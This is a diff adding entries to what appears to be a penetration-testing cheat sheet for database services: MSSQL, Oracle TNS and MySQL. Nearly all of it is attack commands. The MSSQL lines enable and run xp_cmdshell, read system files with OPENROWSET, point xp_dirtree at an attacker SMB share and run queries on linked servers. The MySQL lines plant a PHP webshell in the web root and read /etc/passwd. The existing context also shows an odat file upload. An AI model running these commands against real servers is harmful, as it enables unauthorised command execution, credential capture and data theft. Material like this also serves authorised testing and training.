@@ -330,10 +330,24 @@ $ openssl s_client -connect <IP address>:pop3s
 
 ```
 $ python3 mssqlclient.py <domain>/<username>@<IP address> -windows-auth
+$ sqlcmd -S SRVMSSQL\SQLEXPRESS -U <username> -P '<password>' -y 30 -Y 30
+$ sqsh -S <IP address> -U <username> -P '<password>' -h
+$ sqsh -S <IP address> -U .\\<username> -P '<password>' -h
+SQL> SELECT name FROM master.dbo.sysdatabases
 SQL> SELECT name from sys.databases
+SQL> SELECT * FROM <database name>.INFORMATION_SCHEMA.TABLES
+SQL> USE <database name>;
+SQL> SHOW tables;
+SQL> SELECT * FROM <table name>;
+SQL> SELECT * from <table name> where <column> = "<string>";
 SQL> SELECT is_srvrolemember('sysadmin');
 SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE; sp_configure; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 SQL> EXEC xp_cmdshell "whoami";
+SQL> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+SQL> EXEC master..xp_dirtree '\\<IP address>\share\'
+SQL> EXEC master..xp_subdirs '\\<IP address>\share\'
+SQL> SELECT srvname, isremote FROM sysservers
+SQL> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<IP address>\SQLEXPRESS]
 ```
 
 - Oracle TNS (port 1521)
@@ -359,7 +373,6 @@ $ sudo pip3 install colorlog termcolor passlib python-libnmap
 $ sudo apt-get install build-essential libgmp-dev -y
 $ pip3 install pycryptodome
 $ ./odat.py -h
-
 $ ./odat.py all -s <IP address>
 $ ./odat.py utlfile -s <IP address> -d <database> -U <user> -P <password> --sysdba --putFile <file path> <file name> <output file path>
 $ sqlplus <user>/<password>@<IP address>/<database>
@@ -383,12 +396,16 @@ $ sudo useradd -u <UID> <user>
 
 ```
 $ mysql -h <IP address> -u root
+$ mysql -h <IP address> -u root -p<password>
 MySQL [(none)]> SELECT version();
 MySQL [(none)]> SHOW databases;
 MySQL [(none)]> USE <database name>;
 MySQL [(none)]> SHOW tables;
 MySQL [(none)]> SELECT * FROM <table name>;
 MySQL [(none)]> SELECT * from <table name> where <column> = "<string>";
+MySQL [(none)]> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'
+MySQL [(none)]> show variables like "secure_file_priv";
+MySQL [(none)]> select LOAD_FILE("/etc/passwd");
 ```
 
 - RDP (port 3389)
